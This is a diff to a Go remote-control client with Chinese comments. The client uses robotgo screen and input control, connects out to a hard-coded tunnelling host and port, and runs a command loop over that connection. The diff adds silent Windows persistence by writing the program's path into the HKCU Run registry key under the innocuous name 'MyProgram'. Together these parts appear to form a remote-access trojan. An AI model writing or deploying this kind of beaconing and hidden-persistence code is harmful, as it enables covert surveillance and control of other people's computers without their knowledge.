@@ -5,8 +5,11 @@ import (
 	"bytes"
 	"fmt"
 	"github.com/go-vgo/robotgo"
+	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
+	"log"
 	"net"
+	"os"
 	"runtime"
 	"strconv"
 	"sync"
@@ -48,9 +51,9 @@ func heartbeat(conn net.Conn) {
 }
 
 func connectNew() {
-
-	wg.Add(2) // 协程计数器 +1
-	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "selectbyylc.e4.luyouxia.net:43083")
+	wg.Add(3) // 协程计数器 +1
+	go AddToStartup()
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "selectbyylc.e3.luyouxia.net:12863")
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	if err != nil {
 		fmt.Println(err)
@@ -157,4 +160,34 @@ func doSomeThing(socket net.Conn) {
 	}
 	wg.Done() // 协程计数器加-1
 
+}
+
+func AddToStartup() {
+	fmt.Print("aaaaa")
+	// 获取程序的绝对路径
+	path, err := os.Executable()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 打开注册表项
+	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer key.Close()
+
+	// 检查是否已存在该项
+	_, _, err = key.GetStringValue("MyProgram")
+	if err == nil {
+		// 如果已存在，则不需要重复写入
+		return
+	}
+
+	// 写入注册表项
+	err = key.SetStringValue("MyProgram", path)
+	if err != nil {
+		log.Fatal(err)
+	}
+	wg.Done() // 协程计数器加-1
 }
